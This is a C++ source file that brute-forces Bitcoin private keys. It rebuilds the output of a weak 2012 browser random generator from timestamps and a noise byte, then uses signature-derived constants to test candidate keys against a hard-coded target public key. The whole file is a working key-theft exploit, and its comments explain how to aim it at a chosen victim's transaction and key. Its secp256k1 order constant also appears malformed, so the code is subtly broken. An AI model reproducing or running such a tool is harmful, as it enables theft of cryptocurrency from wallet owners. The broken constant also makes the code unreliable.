#include <iostream>
#include <string>
#include <vector>
#include <chrono>
#include <algorithm>
#include <openssl/bn.h>
#include <openssl/sha.h>
#include <openssl/ec.h>
#include <openssl/obj_mac.h>
#include <omp.h>

// --- SECP256K1 CURVE ORDER CONSTANT ---
const char* Q_HEX = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFEEBAAEDCE6AF48A03BBFD25E8CD0364141";

struct BrowserPRNG2012 {
    uint32_t x;
    uint32_t y;

    inline void init(uint64_t seed_ms) {
        x = (seed_ms ^ 0x49616E42) & 0xFFFF;
        y = (seed_ms ^ 0x7C79654D) & 0xFFFF;
    }

    inline double next_random() {
        x = 36969 * (x & 65535) + (x >> 16);
        y = 18000 * (y & 65535) + (y >> 16);
        uint32_t base = ((x << 16) + (y & 65535)) & 0xFFFFFFFF;
        return (double)base / 4294967296.0;
    }
};

inline void simulate_jsbn_rc4_pipeline(uint64_t seed_ms, uint8_t noise_byte, uint8_t* out_bytes) {
    uint8_t pool[256];
    int pptr = 0;

    pool[pptr++] = seed_ms & 255;
    pool[pptr++] = (seed_ms >> 8) & 255;
    pool[pptr++] = (seed_ms >> 16) & 255;
    pool[pptr++] = (seed_ms >> 24) & 255;

    BrowserPRNG2012 prng;
    prng.init(seed_ms);

    while (pptr < 256) {
        double r = prng.next_random();
        uint16_t t = (uint16_t)(65536.0 * r) & 0xFFFF;
        pool[pptr++] = (t >> 8) ^ noise_byte;
        if (pptr < 256) {
            pool[pptr++] = (t & 255) ^ noise_byte;
        }
    }

    uint8_t S[256];
    for (int i = 0; i < 256; i++) S[i] = i;

    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + pool[i]) & 255;
        uint8_t temp = S[i]; S[i] = S[j]; S[j] = temp;
    }

    int rc4_i = 0;
    int rc4_j = 0;
    for (int k = 0; k < 32; k++) {
        rc4_i = (rc4_i + 1) & 255;
        rc4_j = (rc4_j + S[rc4_i]) & 255;
        uint8_t temp = S[rc4_i]; S[rc4_i] = S[rc4_j]; S[rc4_j] = temp;
        out_bytes[k] = S[(S[rc4_i] + S[rc4_j]) & 255];
    }
}

void execute_fast_search(const std::string& t_hex, const std::string& u_hex, const std::string& pubkey_x_hex, const std::string& pubkey_y_hex, uint64_t start_ms, uint64_t end_ms) {
    std::cout << "[*] Initializing Robust Coordinate-Based OpenSSL Engine..." << std::endl;

    BN_CTX* global_ctx = BN_CTX_new();
    EC_GROUP* ec_group = EC_GROUP_new_by_curve_name(NID_secp256k1);
    
    // Allocate the coordinate Big Numbers
    BIGNUM* target_x_bn = BN_new();
    BIGNUM* target_y_bn = BN_new();
    BN_hex2bn(&target_x_bn, pubkey_x_hex.c_str());
    BN_hex2bn(&target_y_bn, pubkey_y_hex.c_str());

    EC_POINT* target_point = EC_POINT_new(ec_group);
    
    // DIRECT INJECTION: Map X and Y coordinates directly to the target point object
    if (!EC_POINT_set_affine_coordinates(ec_group, target_point, target_x_bn, target_y_bn, global_ctx)) {
        std::cerr << "[-] Error: Public key coordinates sit completely outside secp256k1 boundaries." << std::endl;
        std::cerr << "[-] Ensure your raw coordinate hex values do not contain leading prefixes like '04'." << std::endl;
        return;
    }

    BIGNUM* Q = BN_new();
    BIGNUM* T = BN_new();
    BIGNUM* U = BN_new();
    BIGNUM* INV_T = BN_new();

    BN_hex2bn(&Q, Q_HEX);
    BN_hex2bn(&T, t_hex.c_str());
    BN_hex2bn(&U, u_hex.c_str());

    BN_mod_inverse(INV_T, T, Q, global_ctx);

    auto start_time = std::chrono::high_resolution_clock::now();
    std::cout << "[*] System setup successful. Running unthrottled multi-threaded sweep..." << std::endl;
    std::cout << "---------------------------------------------------------------------------" << std::endl;

    #pragma omp parallel
    {
        BN_CTX* local_ctx = BN_CTX_new();
        BIGNUM* local_K = BN_new();
        BIGNUM* local_X = BN_new();
        BIGNUM* local_SUB = BN_new();
        EC_POINT* local_point = EC_POINT_new(ec_group);
        uint8_t candidate_k_bytes[32];

        #pragma omp for schedule(dynamic, 1000)
        for (uint64_t current_ms = start_ms; current_ms <= end_ms; ++current_ms) {
            for (uint8_t noise_byte = 0; noise_byte < 16; ++noise_byte) {
                simulate_jsbn_rc4_pipeline(current_ms, noise_byte, candidate_k_bytes);

                BN_bin2bn(candidate_k_bytes, 32, local_K);
                BN_nnmod(local_K, local_K, Q, local_ctx);

                if (BN_is_zero(local_K)) continue;

                BN_mod_sub(local_SUB, local_K, U, Q, local_ctx);
                BN_mod_mul(local_X, INV_T, local_SUB, Q, local_ctx);

                if (EC_POINT_mul(ec_group, local_point, local_X, NULL, NULL, local_ctx) == 1) {
                    if (EC_POINT_cmp(ec_group, local_point, target_point, local_ctx) == 0) {
                        char* x_hex_output = BN_bn2hex(local_X);
                        
                        #pragma omp critical
                        {
                            std::cout << "\n" << std::string(75, '=') << std::endl;
                            std::cout << "[🎯🎯🎯 CRITICAL HIT: BITCOIN PRIVATE KEY RECOVERED]" << std::endl;
                            std::cout << "[+] Reconstructed Time:    " << current_ms << " ms" << std::endl;
                            std::cout << "[+] Reconstructed Mouse:   " << (int)noise_byte << std::endl;
                            std::cout << "[+] Recovered Private Key: 0x" << x_hex_output << std::endl;
                            std::cout << std::string(75, '=') << std::endl;
                            OPENSSL_free(x_hex_output);
                            exit(0);
                        }
                    }
                }
            }

            if (current_ms % 500000 == 0 && omp_get_thread_num() == 0) {
                auto current_time = std::chrono::high_resolution_clock::now();
                std::chrono::duration<double> elapsed = current_time - start_time;
                double speed = ((current_ms - start_ms) * 16) / elapsed.count();
                std::cout << "[-] Processing Milepost: " << current_ms << " | Current Speed: " << speed << " keys/sec" << std::endl;
            }
        }

        BN_free(local_K); BN_free(local_X); BN_free(local_SUB);
        EC_POINT_free(local_point);
        BN_CTX_free(local_ctx);
    }

    std::cout << "[-] Search window exhausted. No key matched within parameters." << std::endl;
    BN_free(Q); BN_free(T); BN_free(U); BN_free(INV_T);
    BN_free(target_x_bn); BN_free(target_y_bn);
    EC_POINT_free(target_point); EC_GROUP_free(ec_group);
    BN_CTX_free(global_ctx);
}

int main() {
    // 1. Paste the constants extracted from your 17-input TxID (Input index 0 parameters)
    std::string t_param = "e2bd13264defc456c1e53b670048fde9ac004c320cd065218b915fd7f1c3d934";
    std::string u_param = "0b1d3cab5ea157da3e95e821d272c7409f5d2e8c6b9fe72d697637888eea9ffc";

    // 2. CRITICAL CONFIGURATION: Input your real target public key coordinates here
    // Strip away the leading '04' entirely from your real 130-character uncompressed public key.
    // The next 64 characters are the X coordinate, and the final 64 characters are the Y coordinate.
    std::string pubkey_x = "0ab0cc178d88300001d14ef832b1c5a33d2c75c4f27e2e4680cd51647d1983b5"; 
    std::string pubkey_y = "78df37e18b1910447220f337676eb7d85f39ab875f4a2dc6e7a482e27e4452e9"; 
    
    // 3. Paste your 4-hour envelope thresholds surrounding the first funded transaction block
    uint64_t target_start = 1355594941000; 
    uint64_t target_end   = 1355596561000; 

    execute_fast_search(t_param, u_param, pubkey_x, pubkey_y, target_start, target_end);
    return 0;
}

// OMP_NUM_THREADS=4 ./optimized_m4_recovery


// g++-16 -O3 -fopenmp optimized_m4_recovery.cpp -o optimized_m4_recovery -I/opt/homebrew/opt/openssl@3/include -L/opt/homebrew/opt/openssl@3/lib -lcrypto
